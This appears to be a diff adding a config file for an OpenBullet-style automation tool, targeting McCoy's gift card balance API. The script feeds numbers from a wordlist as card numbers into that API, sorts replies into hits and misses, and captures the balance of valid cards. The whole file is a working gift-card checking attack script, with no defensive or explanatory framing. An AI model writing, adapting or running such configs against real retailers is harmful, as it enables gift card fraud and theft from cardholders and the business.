@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "Mccoys",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-18T01:30:47.7696897+00:00",
+  "AdditionalInfo": "",
+  "Author": "IncogniBarbie",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Balance REQUEST GET "https://www.mccoys.com/mccoysapi/gift/giftcardbalance?cardNo=<USER>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.mccoys.com/gift-cards/balance" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\"isSuccess\":false" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "Status code: 0" 
+  KEYCHAIN Success OR 
+    KEY "\"isSuccess\":true" 
+PARSE "<SOURCE>" JSON "giftBalance" Recursive=FALSE -> CAP "Balance" "" "" 
